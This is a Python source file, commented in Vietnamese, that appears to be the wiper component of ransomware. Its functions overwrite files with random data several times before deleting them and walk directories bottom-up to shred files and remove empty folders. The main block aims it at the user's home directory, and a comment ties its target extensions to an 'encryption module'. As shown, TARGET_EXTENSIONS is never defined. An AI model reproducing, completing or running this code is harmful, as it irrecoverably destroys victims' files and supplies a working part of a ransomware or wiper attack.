# filename: data_wiping_module.py
import os
import random

def secure_delete(filepath, passes=3):
    """Ghi đè tệp tin bằng dữ liệu ngẫu nhiên nhiều lần trước khi xóa."""
    if not os.path.exists(filepath):
        print(f"[-] Tệp tin không tồn tại: {filepath}")
        return

    try:
        with open(filepath, "ba+") as f:
            length = f.tell() # Lấy kích thước tệp tin
        
        for i in range(passes):
            with open(filepath, "rb+") as f:
                f.seek(0)
                # Ghi đè bằng dữ liệu ngẫu nhiên
                f.write(os.urandom(length))
                f.flush()
                os.fsync(f.fileno()) # Đảm bảo dữ liệu được ghi xuống đĩa

        os.remove(filepath)
        print(f"[*] Đã xóa an toàn tệp tin: {filepath}")
    except Exception as e:
        print(f"[-] Lỗi khi xóa an toàn tệp tin {filepath}: {e}")

def wipe_directory(directory_path, target_extensions=None):
    """Duyệt qua thư mục và xóa an toàn các tệp tin hoặc tất cả nếu không có phần mở rộng."""
    if not os.path.exists(directory_path):
        print(f"[-] Thư mục không tồn tại: {directory_path}")
        return

    for dirpath, dirnames, filenames in os.walk(directory_path, topdown=False):
        # Duyệt từ dưới lên để có thể xóa thư mục rỗng sau khi xóa tệp
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            if target_extensions is None or any(filename.endswith(ext) for ext in target_extensions):
                secure_delete(filepath)
        
        # Cố gắng xóa các thư mục rỗng
        try:
            if not os.listdir(dirpath): # Kiểm tra xem thư mục có rỗng không
                os.rmdir(dirpath)
                print(f"[*] Đã xóa thư mục rỗng: {dirpath}")
        except Exception as e:
            # Có thể không xóa được thư mục nếu nó không rỗng hoặc có quyền
            pass

if __name__ == "__main__":
    # Xóa các tệp tin trong thư mục người dùng
    target_directory = os.path.expanduser("~")
    print(f"[+] Bắt đầu xóa dữ liệu an toàn trong thư mục: {target_directory}")
    
    # Bạn có thể cung cấp TARGET_EXTENSIONS từ module mã hóa hoặc xóa tất cả (None)
    wipe_directory(target_directory, target_extensions=TARGET_EXTENSIONS)
    print("[+] Quá trình xóa dữ liệu hoàn tất.")
